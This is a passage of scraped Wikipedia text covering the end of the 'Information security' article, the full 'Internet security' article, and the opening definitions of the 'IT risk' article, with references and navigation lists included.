^ "Computer Misuse Act 1990". legislation.gov.uk. The National Archives. Retrieved 25 January 2018.

^ "Directive 2006/24/EC of the European Parliament and of the Council of 15 March 2006". EUR-Lex. European Union. Retrieved 25 January 2018.

^ "Defamation, Student Records, and the Federal Family Education Rights and Privacy Act", Higher Education Law, Routledge, pp. 361–394, 2010-12-14, doi:10.4324/9780203846940-22, ISBN 978-0-203-84694-0, retrieved 2021-06-05

^ a b "Alabama Schools Receive NCLB Grant To Improve Student Achievement". PsycEXTRA Dataset. 2004. doi:10.1037/e486682006-001. Retrieved 2021-06-05.

^ Turner-Gottschang, Karen (1987). China bound : a guide to academic life and work in the PRC : for the Committee on Scholarly Communication with the People's Republic of China, National Academy of Sciences, American Council of Learned Societies, Social Science Research Council. National Academy Press. ISBN 0-309-56739-4. OCLC 326709779.

^ Codified at 20 U.S.C. § 1232g, with implementing regulations in title 34, part 99 of the Code of Federal Regulations

^ "Audit Booklet". Information Technology Examination Handbook. FFIEC. Retrieved 25 January 2018.

^ Ray, Amy W. (2004), "Health Insurance Portability and Accountability Act (HIPAA)", Encyclopedia of Health Care Management, Thousand Oaks, CA: SAGE Publications, Inc., doi:10.4135/9781412950602.n369, ISBN 978-0-7619-2674-0, retrieved 2021-06-05

^ "Public Law 104 - 191 - Health Insurance Portability and Accountability Act of 1996". U.S. Government Publishing Office. Retrieved 25 January 2018.

^ "Public Law 106 - 102 - Gramm–Leach–Bliley Act of 1999" (PDF). U.S. Government Publishing Office. Retrieved 25 January 2018.

^ Alase, Abayomi Oluwatosin (2016). The impact of the Sarbanes-Oxley Act (SOX) on small-sized publicly traded companies and their communities (Thesis). Northeastern University Library. doi:10.17760/d20204801.

^ Solis, Lupita (2019). Educational and Professional Trends of Chief Financial Officers (Thesis). Portland State University Library. doi:10.15760/honors.763.

^ "Public Law 107 - 204 - Sarbanes-Oxley Act of 2002". U.S. Government Publishing Office. Retrieved 25 January 2018.

^ "Pci Dss Glossary, Abbreviations, and Acronyms", Payment Card Industry Data Security Standard Handbook, Hoboken, NJ, USA: John Wiley & Sons, Inc., pp. 185–199, 2015-09-18, doi:10.1002/9781119197218.gloss, ISBN 978-1-119-19721-8, retrieved 2021-06-05

^ "PCI Breakdown (Control Objectives and Associated Standards)", Payment Card Industry Data Security Standard Handbook, Hoboken, NJ, USA: John Wiley & Sons, Inc., p. 61, 2015-09-18, doi:10.1002/9781119197218.part2, ISBN 978-1-119-19721-8, retrieved 2021-06-05

^ Ravallion, Martin; Chen, Shaohua (August 2017). "Welfare-Consistent Global Poverty Measures". doi:10.3386/w23739. Retrieved 18 January 2022. {{cite journal}}: Cite journal requires |journal= (help)

^ "Payment Card Industry (PCI) Data Security Standard: Requirements and Security Assessment Procedures - Version 3.2" (PDF). Security Standards Council. April 2016. Retrieved 25 January 2018.

^ "Security Breach Notification Laws". National Conference of State Legislatures. 12 April 2017. Retrieved 25 January 2018.

^ Stein, Stuart G.; Schaberg, Richard A.; Biddle, Laura R., eds. (23 June 2015). Financial institutions answer book, 2015 : law, governance, compliance. ISBN 978-1-4024-2405-2. OCLC 911952833.

^ "Personal Information and Data Protection", Protecting Personal Information, Hart Publishing, 2019, doi:10.5040/9781509924882.ch-002, ISBN 978-1-5099-2485-1, S2CID 239275871, retrieved 2021-06-05

^ Chapter 5. An Act to support and promote electronic commerce by protecting personal information that is collected, used or disclosed in certain circumstances, by providing for the use of electronic means to communicate or record information or transactions and by amending the Canada Evidence Act, the Statutory Instruments Act and the Statute Revision Act. Queen's Printer for Canada. 2000. OCLC 61417862.

^ "Comments". Statute Law Review. 5 (1): 184–188. 1984. doi:10.1093/slr/5.1.184. ISSN 0144-3593.

^ "Personal Information Protection and Electronic Documents Act" (PDF). Canadian Minister of Justice. Retrieved 25 January 2018.

^ Werner, Martin (2011-05-11). "Privacy-protected communication for location-based services". Security and Communication Networks. 9 (2): 130–138. doi:10.1002/sec.330. ISSN 1939-0114.

^ "Regulation for the Assurance of Confidentiality in Electronic Communications" (PDF). Government Gazette of the Hellenic Republic. Hellenic Authority for Communication Security and Privacy. 17 November 2011. Retrieved 25 January 2018.

^ de Guise, Preston (2020-04-29), "Security, Privacy, Ethical, and Legal Considerations", Data Protection, Auerbach Publications, pp. 91–108, doi:10.1201/9780367463496-9, ISBN 978-0-367-46349-6, S2CID 219013948, retrieved 2021-06-05

^ "Αριθμ. απόφ. 205/2013" (PDF). Government Gazette of the Hellenic Republic. Hellenic Authority for Communication Security and Privacy. 15 July 2013. Retrieved 25 January 2018.

^ Andersson and Reimers, 2019, CYBER SECURITY EMPLOYMENT POLICY AND WORKPLACE DEMAND IN THE U.S. GOVERNMENT, EDULEARN19 Proceedings, Publication year: 2019 Pages: 7858-7866 https://library.iated.org/view/ANDERSON2019CYB

^ "Definition of Security Culture". The Security Culture Framework. 9 April 2014.

^ Roer, Kai; Petric, Gregor (2017). The 2017 Security Culture Report - In depth insights into the human factor. CLTRe North America, Inc. pp. 42–43. ISBN 978-1544933948.

^ Akhtar, Salman, ed. (2018-03-21). Good Feelings. Routledge. doi:10.4324/9780429475313. ISBN 9780429475313.

^ Anderson, D., Reimers, K. and Barretto, C. (March 2014). Post-Secondary Education Network Security: Results of Addressing the End-User Challenge.publication date Mar 11, 2014 publication description INTED2014 (International Technology, Education, and Development Conference)

^ a b Schlienger, Thomas; Teufel, Stephanie (December 2003). "Information security culture - from analysis to change". South African Computer Society (SAICSIT). 2003 (31): 46–52. hdl:10520/EJC27949.

^ "IISP Skills Framework". Archived from the original on 2014-03-15. Retrieved 2014-04-27.

^ "BSI-Standards". BSI. Archived from the original on 3 December 2013. Retrieved 29 November 2013.


Further reading[edit]

Anderson, K., "IT Security Professionals Must Evolve for Changing Market", SC Magazine, October 12, 2006.
Aceituno, V., "On Information Security Paradigms", ISSA Journal, September 2005.
Dhillon, G., Principles of Information Systems Security: text and cases, John Wiley & Sons, 2007.
Easttom, C., Computer Security Fundamentals (2nd Edition) Pearson Education, 2011.
Lambo, T., "ISO/IEC 27001: The future of infosec certification", ISSA Journal, November 2006.
Dustin, D., " Awareness of How Your Data is Being Used and What to Do About It", "CDR Blog", May 2017.
Bibliography[edit]
Allen, Julia H. (2001). The CERT Guide to System and Network Security Practices. Boston, MA: Addison-Wesley. ISBN 978-0-201-73723-3.
Krutz, Ronald L.; Russell Dean Vines (2003). The CISSP Prep Guide (Gold ed.). Indianapolis, IN: Wiley. ISBN 978-0-471-26802-4.
Layton, Timothy P. (2007). Information Security: Design, Implementation, Measurement, and Compliance. Boca Raton, FL: Auerbach publications. ISBN 978-0-8493-7087-8.
McNab, Chris (2004). Network Security Assessment. Sebastopol, CA: O'Reilly. ISBN 978-0-596-00611-2.
Peltier, Thomas R. (2001). Information Security Risk Analysis. Boca Raton, FL: Auerbach publications. ISBN 978-0-8493-0880-2.
Peltier, Thomas R. (2002). Information Security Policies, Procedures, and Standards: guidelines for effective information security management. Boca Raton, FL: Auerbach publications. ISBN 978-0-8493-1137-6.
White, Gregory (2003). All-in-one Security+ Certification Exam Guide. Emeryville, CA: McGraw-Hill/Osborne. ISBN 978-0-07-222633-1.
Dhillon, Gurpreet (2007). Principles of Information Systems Security: text and cases. NY: John Wiley & Sons. ISBN 978-0-471-45056-6.
Whitman, Michael; Mattord, Herbert (2017). Principles of Information Security. Cengage. ISBN 978-1337102063.

External links[edit]



Wikimedia Commons has media related to Information security.

DoD IA Policy Chart Archived 2011-09-06 at the Wayback Machine on the DoD Information Assurance Technology Analysis Center web site.
patterns & practices Security Engineering Explained
Open Security Architecture- Controls and patterns to secure IT systems
IWS – Information Security Chapter Archived 2019-11-08 at the Wayback Machine
Ross Anderson's book "Security Engineering"
vteComputer scienceNote: This template roughly follows the 2012 ACM Computing Classification System.Hardware
Printed circuit board
Peripheral
Integrated circuit
Very Large Scale Integration
Systems on Chip (SoCs)
Energy consumption (Green computing)
Electronic design automation
Hardware acceleration
Computer systems organization
Computer architecture
Embedded system
Real-time computing
Dependability
Networks
Network architecture
Network protocol
Network components
Network scheduler
Network performance evaluation
Network service
Software organization
Interpreter
Middleware
Virtual machine
Operating system
Software quality
Software notations and tools
Programming paradigm
Programming language
Compiler
Domain-specific language
Modeling language
Software framework
Integrated development environment
Software configuration management
Software library
Software repository
Software development
Control variable
Software development process
Requirements analysis
Software design
Software construction
Software deployment
Software engineering
Software maintenance
Programming team
Open-source model
Theory of computation
Model of computation
Formal language
Automata theory
Computability theory
Computational complexity theory
Logic
Semantics
Algorithms
Algorithm design
Analysis of algorithms
Algorithmic efficiency
Randomized algorithm
Computational geometry
Mathematics of computing
Discrete mathematics
Probability
Statistics
Mathematical software
Information theory
Mathematical analysis
Numerical analysis
Theoretical computer science
Information systems
Database management system
Information storage systems
Enterprise information system
Social information systems
Geographic information system
Decision support system
Process control system
Multimedia information system
Data mining
Digital library
Computing platform
Digital marketing
World Wide Web
Information retrieval
Security
Cryptography
Formal methods
Security services
Intrusion detection system
Hardware security
Network security
Information security
Application security
Human–computer interaction
Interaction design
Social computing
Ubiquitous computing
Visualization
Accessibility
Synthography
Concurrency
Concurrent computing
Parallel computing
Distributed computing
Multithreading
Multiprocessing
Artificial intelligence
Natural language processing
Knowledge representation and reasoning
Computer vision
Automated planning and scheduling
Search methodology
Control method
Philosophy of artificial intelligence
Distributed artificial intelligence
Machine learning
Supervised learning
Unsupervised learning
Reinforcement learning
Multi-task learning
Cross-validation
Graphics
Animation
Rendering
Image manipulation
Graphics processing unit
Mixed reality
Virtual reality
Image compression
Solid modeling
Applied computing
E-commerce
Enterprise software
Computational mathematics
Computational physics
Computational chemistry
Computational biology
Computational social science
Computational engineering
Computational healthcare
Digital art
Electronic publishing
Cyberwarfare
Electronic voting
Video games
Word processing
Operations research
Educational technology
Document management

 Category
 Outline
WikiProject
 Commons

Authority control: National libraries 
Czech Republic





Retrieved from "https://en.wikipedia.org/w/index.php?title=Information_security&oldid=1135159322"
Categories: Data securitySecurityCrime preventionNational securityCryptographyInformation governanceHidden categories: Articles lacking reliable references from October 2022All articles lacking reliable referencesCS1 errors: missing periodicalCS1 maint: multiple names: authors listCS1 errors: missing titleWebarchive template wayback linksWikipedia articles needing page number citations from January 2023Articles with short descriptionShort description is different from WikidataAll articles with unsourced statementsArticles with unsourced statements from June 2021Articles containing potentially dated statements from 2013All articles containing potentially dated statementsArticles to be expanded from January 2018All articles to be expandedArticles using small message boxesArticles with unsourced statements from January 2023Commons category link from WikidataArticles with NKC identifiers
 



From Wikipedia, the free encyclopedia


Branch of computer security
This article needs additional citations for verification. Please help improve this article by adding citations to reliable sources. Unsourced material may be challenged and removed.Find sources: "Internet security" – news · newspapers · books · scholar · JSTOR (April 2009) (Learn how and when to remove this template message)
Part of a series onInformation security
Related security categories
Computer security
Automotive security
Cybercrime
Cybersex trafficking
Computer fraud
Cybergeddon
Cyberterrorism
Cyberwarfare
Electronic warfare
Information warfare
Internet security
Mobile security
Network security
Copy protection
Digital rights management

Threats
Adware
Advanced persistent threat
Arbitrary code execution
Backdoors
Hardware backdoors
Code injection
Crimeware
Cross-site scripting
Cryptojacking malware
Botnets
Data breach
Drive-by download
Browser helper objects
Viruses
Data scraping
Denial of service
Eavesdropping
Email fraud
Email spoofing
Exploits
Keyloggers
Logic bombs
Time bombs
Fork bombs
Zip bombs
Fraudulent dialers
Malware
Payload
Phishing
Polymorphic engine
Privilege escalation
Ransomware
Rootkits
Bootkits
Scareware
Shellcode
Spamming
Social engineering
Screen scraping
Spyware
Software bugs
Trojan horses
Hardware Trojans
Remote access trojans
Vulnerability
Web shells
Wiper
Worms
SQL injection
Rogue security software
Zombie

Defenses
Application security
Secure coding
Secure by default
Secure by design
Misuse case
Computer access control
Authentication
Multi-factor authentication
Authorization
Computer security software
Antivirus software
Security-focused operating system
Data-centric security
Code obfuscation
Data masking
Encryption
Firewall
Intrusion detection system
Host-based intrusion detection system (HIDS)
Anomaly detection
Security information and event management (SIEM)
Mobile secure gateway
Runtime application self-protection
vte
Internet security is a branch of computer security. It encompasses the Internet, browser security, web site security,[1] and network security as it applies to other applications or operating systems as a whole. Its objective is to establish rules and measures to use against attacks over the Internet.[2] The Internet is an inherently insecure channel for information exchange, with high risk of intrusion or fraud, such as phishing,[3] online viruses, trojans, ransomware and worms.

Many methods are used to combat these threats, including encryption and ground-up engineering.[4]
Threats[edit]
Malicious software[edit]
Malicious software comes in many forms, such as viruses, Trojan horses, spyware, and worms.

Malware, a portmanteau of malicious software, is any software used to disrupt computer operation, gather sensitive information, or gain access to private computer systems. Malware is defined by its malicious intent, acting against the requirements of the computer user, and does not include software that unintentionally causes harm due to some deficiency. The term badware applies to both malware and unintentionally harmful software.
A botnet is a network of computers that have been taken over by a robot or bot that performs large-scale malicious acts for its creator.
Computer viruses are programs that can replicate their structures or effects by infecting other files or structures on a computer. The typical purpose of a virus is to take over a computer to steal data.
Computer worms are programs that can replicate themselves throughout a computer network.
Ransomware is a type of malware that restricts access to the computer system that it infects, and demands a ransom in order for the restriction to be removed.
Scareware is a program of usually limited or no benefit, containing malicious payloads, that is sold via unethical marketing practices. The selling approach uses social engineering to cause shock, anxiety, or the perception of a threat, generally directed at an unsuspecting user.
Spyware refers to programs that surreptitiously monitor activity on a computer system and report that information to others without the user's consent.
One particular kind of spyware is key logging malware. Often referred to as keylogging or keyboard capturing, is the action of recording (logging) the keys struck on a keyboard.
A Trojan horse, commonly known as a Trojan, is a general term for malware that pretends to be harmless, so that a user will be convinced to download it onto the computer.
Denial-of-service attacks[edit]
A denial-of-service attack (DoS) or distributed denial-of-service attack (DDoS) is an attempt to make a computer resource unavailable to its intended users. It works by making so many service requests at once that the system is overwhelmed and becomes unable to process any of them. DoS may target cloud computing systems.[5] According to business participants in an international security survey, 25% of respondents experienced a DoS attack in 2007 and another 16.8% in 2010.[6] DoS attacks often use bots (or a botnet) to carry out the attack.

Phishing[edit]
Main article: Phishing
Phishing targets online users in an attempt to extract sensitive information such as passwords and financial information.[7] Phishing occurs when the attacker pretends to be a trustworthy entity, either via email or a web page. Victims are directed to web pages that appear to be legitimate, but instead route information to the attackers. Tactics such as email spoofing attempt to make emails appear to be from legitimate senders, or long complex URLs hide the actual website.[8][9] Insurance group RSA claimed that phishing accounted for worldwide losses of $10.8 billion in 2016.[10]

Man in the middle[edit]
A man-in-the-middle (MITM) attack is a type of cyber attack. Cybercriminals can intercept data sent between people to steal, eavesdrop or modify data for certain malicious purposes, such as extorting money and identity theft. Public WiFi is often insecure because monitoring or intercepting Web traffic is unknown.[citation needed]

Application vulnerabilities[edit]
Main article: Application security
Applications used to access Internet resources may contain security vulnerabilities such as memory safety bugs or flawed authentication checks. Such bugs can give network attackers full control over the computer.[11][12]
A widespread web-browser application vulnerability is the cross-origin resource sharing (CORS) vulnerability - for maximum security and privacy, make sure to adopt adequate countermeasures against it (such as the patches provided for WebKit-based browsers).[13]

Countermeasures[edit]
Network layer security[edit]
TCP/IP protocols may be secured with cryptographic methods and security protocols. These protocols include Secure Sockets Layer (SSL), succeeded by Transport Layer Security (TLS) for web traffic, Pretty Good Privacy (PGP) for email, and IPsec for the network layer security.[14]

Internet Protocol Security (IPsec)[edit]
IPsec is designed to protect TCP/IP communication in a secure manner. It is a set of security extensions developed by the Internet Engineering Task Force (IETF). It provides security and authentication at the IP layer by transforming data using encryption. Two main types of transformation form the basis of IPsec: the Authentication Header (AH) and ESP. They provide data integrity, data origin authentication, and anti-replay services. These protocols can be used alone or in combination.
Basic components include:

Security protocols for AH and ESP
Security association for policy management and traffic processing
Manual and automatic key management for the Internet key exchange (IKE)
Algorithms for authentication and encryption
The algorithm allows these sets to work independently without affecting other parts of the implementation. The IPsec implementation is operated in a host or security gateway environment giving protection to IP traffic.

Threat modeling[edit]
Threat Modeling tools helps you to proactively analyze the cyber security posture of a system or system of systems and in that way prevent security threats.

Multi-factor authentication[edit]
Multi-factor authentication (MFA) is an access control method of in which a user is granted access only after successfully presenting separate pieces of evidence to an authentication mechanism – two or more from the following categories: knowledge (something they know), possession (something they have), and inherence (something they are).[15][16] Internet resources, such as websites and email, may be secured using this technique.

Security token[edit]
Some online sites offer customers the ability to use a six-digit code which randomly changes every 30–60 seconds on a physical security token. The token has built-in computations and manipulates numbers based on the current time. This means that every thirty seconds only a certain array of numbers validate access. The website is made aware of that device's serial number and knows the computation and correct time to verify the number. After 30–60 seconds the device presents a new random six-digit number to log into the website.[17]

Electronic mail security[edit]
Background[edit]
Email messages are composed, delivered, and stored in a multiple step process, which starts with the message's composition. When a message is sent, it is transformed into a standard format according to RFC 2822.[18] Using a network connection, the mail client sends the sender's identity, the recipient list and the message content to the server. Once the server receives this information, it forwards the message to the recipients.

Pretty Good Privacy (PGP)[edit]
Pretty Good Privacy provides confidentiality by encrypting messages to be transmitted or data files to be stored using an encryption algorithm such as Triple DES or CAST-128. Email messages can be protected by using cryptography in various ways, such as the following:

Digitally signing the message to ensure its integrity and confirm the sender's identity.
Encrypting the message body of an email message to ensure its confidentiality.
Encrypting the communications between mail servers to protect the confidentiality of both message body and message header.
The first two methods, message signing and message body encryption, are often used together; however, encrypting the transmissions between mail servers is typically used only when two organizations want to protect emails regularly sent between them. For example, the organizations could establish a virtual private network (VPN) to encrypt communications between their mail servers.[19] Unlike methods that only encrypt a message body, a VPN can encrypt all communication over the connection, including email header information such as senders, recipients, and subjects. However, a VPN does not provide a message signing mechanism, nor can it provide protection for email messages along the entire route from sender to recipient.

Message Authentication Code[edit]
A Message authentication code (MAC) is a cryptography method that uses a secret key to digitally sign a message. This method outputs a MAC value that can be decrypted by the receiver, using the same secret key used by the sender. The Message Authentication Code protects both a message's data integrity as well as its authenticity.[20]

Firewalls[edit]
A computer firewall controls access to a single computer. A network firewall controls access to an entire network. A firewall is a security device — computer hardware or software — that filters traffic and blocks outsiders. It generally consists of gateways and filters. Firewalls can also screen network traffic and block traffic deemed unauthorized. 

Web security[edit]
Firewalls restrict incoming and outgoing network packets. Only authorized traffic is allowed to pass through it. Firewalls create checkpoints between networks and computers. Firewalls can block traffic based on IP source and TCP port number. They can also serve as the platform for IPsec. Using tunnel mode, firewalls can implement VPNs. Firewalls can also limit network exposure by hiding the internal network from the public Internet.

Types of firewall[edit]
Packet filter[edit]
A packet filter processes network traffic on a packet-by-packet basis. Its main job is to filter traffic from a remote IP host, so a router is needed to connect the internal network to the Internet. The router is known as a screening router, which screens packets leaving and entering the network.

Stateful packet inspection[edit]
In a stateful firewall the circuit-level gateway is a proxy server that operates at the network level of an Open Systems Interconnect (OSI) model and statically defines what traffic will be allowed. Circuit proxies forward network packets (formatted data) containing a given port number, if the port is permitted by the algorithm. The main advantage of a proxy server is its ability to provide Network Address Translation (NAT), which can hide the user's IP address from the Internet, effectively protecting internal information from the outside.

Application-level gateway[edit]
An application-level firewall is a third-generation firewall where a proxy server operates at the very top of the OSI model, the IP suite application level. A network packet is forwarded only if a connection is established using a known protocol. Application-level gateways are notable for analyzing entire messages rather than individual packets.

Browser choice[edit]
Main article: Browser security
Web browser market share predicts the share of hacker attacks. For example, Internet Explorer 6, which used to lead the market,[21] was heavily attacked.[22]


Protections[edit]
Antivirus[edit]
Antivirus software can protect a programmable device by detecting and eliminating malware.[23] A variety of techniques are used, such as signature-based, heuristics, rootkit, and real-time.

Password managers[edit]
A password manager is a software application that creates, stores and provides passwords to applications. Password managers encrypt passwords. The user only needs to remember a single master password to access the store.[24]

Security suites[edit]
Security suites were first offered for sale in 2003 (McAfee) and contain firewalls, anti-virus, anti-spyware and other components.[25] They also offer theft protection, portable storage device safety check, private Internet browsing, cloud anti-spam, a file shredder or make security-related decisions (answering popup windows) and several were free of charge.[26]

History[edit]
At the National Association of Mutual Savings Banks (NAMSB) conference in January 1976, Atalla Corporation (founded by Mohamed Atalla) and Bunker Ramo Corporation (founded by George Bunker and Simon Ramo) introduced the earliest products designed for dealing with online security. Atalla later added its Identikey hardware security module, andj supported processing online transactions and network security. Designed to process bank transactions online, the Identikey system was extended to shared-facility operations. It was compatible with various switching networks, and was capable of resetting itself electronically to any one of 64,000 irreversible nonlinear algorithms as directed by card data information.[27] In 1979, Atalla introduced the first network security processor (NSP).[28]

See also[edit]

Comparison of antivirus software
Comparison of firewalls
Cybersecurity information technology list
Cyberspace Electronic Security Act (in the US)
Identity Driven Networking
Internet Crime Complaint Center
Internet safety
Network security policy
Usability of web authentication systems
Usable Security
Web literacy (Security)

References[edit]


^ "What Is Internet Security? | McAfee". www.mcafee.com. Retrieved 2021-09-05.

^ Gralla, Preston (2007). How the Internet Works. Indianapolis: Que Pub. ISBN 978-0-7897-2132-7.

^ Rhee, M. Y. (2003). Internet Security: Cryptographic Principles, Algorithms and Protocols. Chichester: Wiley. ISBN 0-470-85285-2.

^ "101 Data Protection Tips: How to Keep Your Passwords, Financial & Personal Information Safe in 2020". Digital Guardian. 2019-12-16. Retrieved 2020-10-23.

^ Yan, Q.; Yu, F. R.; Gong, Q.; Li, J. (2016). "Software-Defined Networking (SDN) and Distributed Denial of Service (DDoS) Attacks in Cloud Computing Environments: A Survey, Some Research Issues, and Challenges". IEEE Communications Surveys and Tutorials. 18 (1): 602–622. doi:10.1109/COMST.2015.2487361. S2CID 20786481.

^ "Information Sy-infographic". University of Alabama at Birmingham Business Program. {{cite web}}: Missing or empty |url= (help)

^ Izak, Belarua. "Welke virusscanners zijn het beste voor macOS High Sierra". Virusscanner MAC (in Dutch). Retrieved 4 January 2018.

^ Ramzan, Zulfikar (2010). "Phishing attacks and countermeasures".  In Stamp, Mark; Stavroulakis, Peter (eds.). Handbook of Information and Communication Security. Springer. ISBN 9783642041174.{{cite book}}:  CS1 maint: uses authors parameter (link)

^ van der Merwe, Alta; Loock, Marianne; Dabrowski, Marek (2005). "Characteristics and Responsibilities Involved in a Phishing Attack". Proceedings of the 4th International Symposium on Information and Communication Technologies. Trinity College Dublin: 249–254. ISBN 9781595931696. Retrieved 4 January 2018.

^ Long, Mathew (February 22, 2017). "Fraud Insights Through Integration". RSA. Archived from the original on October 20, 2018. Retrieved October 20, 2018.

^ "Improving Web Application Security: Threats and Countermeasures". msdn.microsoft.com. Retrieved 2016-04-05.

^ "Justice Department charges Russian spies and criminal hackers in Yahoo intrusion". Washington Post. Retrieved 15 March 2017.

^ "Unofficial WebKit CORS vulnerability patches". webkit-cors-vulnerability.trentalancia.com. Retrieved 2021-05-01.

^ "Securing the Network Layer Against Malicious Attacks". TDK Technologies. October 27, 2020.

^ "Two-factor authentication: What you need to know (FAQ) – CNET". CNET. Retrieved 2015-10-31.

^ "How to extract data from an iCloud account with two-factor authentication activated". iphonebackupextractor.com. Retrieved 2016-06-08.

^ Margaret Rouse (September 2005). "What is a security token?". SearchSecurity.com. Retrieved 2014-02-14.

^ Resnick, Peter W. (2001).  Resnick, P (ed.). "Internet Message Format". tools.ietf.org. doi:10.17487/RFC2822. Retrieved 2021-05-01.{{cite journal}}:  CS1 maint: url-status (link)

^ "Virtual Private Network". NASA. Archived from the original on 2013-06-03. Retrieved 2014-02-14.

^ "What Is a Message Authentication Code?". Wisegeek.com. Retrieved 2013-04-20.

^ "Browser Statistics". W3Schools.com. Retrieved 2011-08-10.

^ Bradly, Tony. "It's Time to Finally Drop Internet Explorer 6". PCWorld.com. Retrieved 2010-11-09.

^ Larkin, Eric (2008-08-26). "Build Your Own Free Security Suite". Archived from the original on 2010-11-06. Retrieved 2010-11-09.

^ "USE A FREE PASSWORD MANAGER" (PDF). scsccbkk.org. Archived from the original (PDF) on 2016-01-25. Retrieved 2016-06-17.

^ Rebbapragada, Narasu. "All-in-one Security". PC World.com. Archived from the original on October 27, 2010. Retrieved 2010-11-09.

^ "Free products for PC security". 2015-10-08.

^ "Four Products for On-Line Transactions Unveiled". Computerworld. IDG Enterprise. 10 (4): 3. 26 January 1976.

^ Burkey, Darren (May 2018). "Data Security Overview" (PDF). Micro Focus. Retrieved 21 August 2019.


External links[edit]



Wikimedia Commons has media related to Internet security.

National Institute of Standards and Technology (NIST.gov) - Information Technology portal with links to computer- and cyber security
National Institute of Standards and Technology (NIST.gov) -Computer Security Resource Center -Guidelines on Electronic Mail Security, version 2
PwdHash Stanford University - Firefox & IE browser extensions that transparently convert a user's password into a domain-specific password.
Cybertelecom.org Security - surveying federal Internet security work
DSL Reports.com- Broadband Reports, FAQs and forums on Internet security, est 1999




Retrieved from "https://en.wikipedia.org/w/index.php?title=Internet_security&oldid=1136324249"
Categories: Internet securityWeb security exploitsHidden categories: CS1 errors: requires URLCS1 Dutch-language sources (nl)CS1 maint: uses authors parameterCS1 maint: url-statusArticles with short descriptionShort description is different from WikidataArticles needing additional references from April 2009All articles needing additional referencesAll articles with unsourced statementsArticles with unsourced statements from August 2022Commons category link from Wikidata
 



From Wikipedia, the free encyclopedia


Any risk related to information technology
Information technology risk, IT risk, IT-related risk, or cyber risk is any risk related to information technology.[1] While information has long been appreciated as a valuable and important asset, the rise of the knowledge economy and the Digital Revolution has led to organizations becoming increasingly dependent on information, information processing and especially IT.  Various events or incidents that compromise IT in some way can therefore cause adverse impacts on the organization's business processes or mission, ranging from inconsequential to catastrophic in scale.
Assessing the probability or likelihood of various types of event/incident with their predicted impacts or consequences, should they occur, is a common way to assess and measure IT risks.[2]  Alternative methods of measuring IT risk typically involve assessing other contributory factors such as the threats, vulnerabilities, exposures, and asset values.[3][4]


Definitions[edit]
ISO[edit]
IT risk: the potential that a given threat will exploit vulnerabilities of an asset or group of assets and thereby cause harm to the organization. It is measured in terms of a combination of the probability of occurrence of an event and its consequence.[5]

Committee on National Security Systems[edit]
The Committee on National Security Systems of United States of America defined risk in different documents:

From CNSS Instruction No. 4009 dated 26 April 2010[6] the basic and more technical focused definition:
Risk – Possibility that a particular threat will adversely impact an IS by exploiting a particular vulnerability.
National Security Telecommunications and Information Systems Security Instruction (NSTISSI) No. 1000,[7] introduces a probability aspect, quite similar to NIST SP 800-30 one:
Risk – A combination of the likelihood that a threat will occur, the likelihood that a threat occurrence will result in an adverse impact, and the severity of the resulting impact
National Information Assurance Training and Education Center defines risk in the IT field as:[8]

The loss potential that exists as the result of threat-vulnerability pairs. Reducing either the threat or the vulnerability reduces the risk.
The uncertainty of loss expressed in terms of probability of such loss.
The probability that a hostile entity will successfully exploit a particular telecommunications or COMSEC system for intelligence purposes; its factors are threat and vulnerability.
A combination of the likelihood that a threat shall occur, the likelihood that a threat occurrence shall result in an adverse impact, and the severity of the resulting adverse impact.
the probability that a particular threat will exploit a particular vulnerability of the system.
NIST[edit]
Many NIST publications define risk in IT context in different publications: FISMApedia[9] term[10] provide a list. Between them:

According to NIST SP 800-30:[11]
Risk is a function of the likelihood of a given threat-source’s exercising a particular potential vulnerability, and the resulting impact of that adverse event on the organization.
From NIST FIPS 200[12]
Risk – The level of impact on organizational operations (including mission, functions, image, or reputation), organizational assets, or individuals resulting from the operation of an information system given the potential impact of a threat and the likelihood of that threat occurring.
NIST SP 800-30[11] defines:

IT-related risk

The net mission impact considering:
the probability that a particular threat-source will exercise (accidentally trigger or intentionally exploit) a particular information system vulnerability and
the resulting impact if this should occur. IT-related risks arise from legal liability or mission loss due to:
Unauthorized (malicious or accidental) disclosure, modification, or destruction of information
Unintentional errors and omissions
IT disruptions due to natural or man-made disasters
Failure to exercise due care and diligence in the implementation and operation of the IT system.
Risk management insight[edit]
IT risk is the probable frequency and probable magnitude of future loss.[13]

ISACA[edit]
ISACA published the Risk IT Framework in order to provide an end-to-end, comprehensive view of all risks related to the use of IT. There,[14] IT risk is defined as:

The business risk associated with the use, ownership, operation, involvement, influence and adoption of IT within an enterprise
According to Risk IT,[14] IT risk has a broader meaning: it encompasses not just only the negative impact of operations and service delivery which can bring destruction or reduction of the value of the organization, but also the benefit\value enabling risk associated to missing opportunities to use technology to enable or enhance business or the IT project management for aspects like overspending or late delivery with adverse business impact

Measuring IT risk[edit]
You can't effectively and consistently manage what you can't measure, and you can't measure what you haven't defined.[13][15]
Measuring IT risk (or cyber risk) can occur at many levels. At a business level, the risks are managed categorically. Front line IT departments and NOC's tend to measure more discrete, individual risks. Managing the nexus between them is a key role for modern CISO's.

When measuring risk of any kind, selecting the correct equation for a given threat, asset, and available data is an important step. Doing so is subject unto itself, but there are common components of risk equations that are helpful to understand. There are four fundamental forces involved in risk management, which also apply to cybersecurity. They are assets, impact, threats, and likelihood. You have internal knowledge of and a fair amount of control over assets, which are tangible and intangible things that have value. You also have some control over impact, which refers to loss of, or damage to, an asset. However, threats that represent adversaries and their methods of attack are external to your control. Likelihood is the wild card in the bunch. Likelihoods determine if and when a threat will materialize, succeed, and do damage. While never fully under your control, likelihoods can be shaped and influenced to manage the risk.
[16]Mathematically, the forces can be represented in a formula such as: 



R
i
s
k
=
p
(
A
s
s
e
t
,
T
h
r
e
a
t
)
×
d
(
A
s
s
e
t
,
T
h
r
e
a
t
)


{\textstyle Risk=p(Asset,Threat)\times d(Asset,Threat)}

 where p() is the likelihood that a Threat will materialize/succeed against an Asset, and d() is the likelihood of various levels of damage that may occur.[17] The field of IT risk management has spawned a number of terms and techniques which are unique to the industry. Some industry terms have yet to be reconciled. For example, the term vulnerability is often used interchangeably with likelihood of occurrence, which can be problematic.  Often encountered IT risk management terms and techniques include:
Information security event
An identified occurrence of a system, service or network state indicating a possible breach of information security policy or failure of safeguards, or a previously unknown situation that may be security relevant.[5]
Occurrence of a particular set of circumstances[18]
The event can be certain or uncertain.
The event can be a single occurrence or a series of occurrences. :(ISO/IEC Guide 73)
Information security incident

is indicated by a single or a series of unwanted information security events that have a significant probability of compromising business operations and threatening information security[5]
An event [G.11] that has been assessed as having an actual or potentially adverse effect on the security or performance of a system.[19]
Impact[20]
The result of an unwanted incident [G.17].(ISO/IEC PDTR 13335-1)
Consequence[21]
Outcome of an event [G.11]
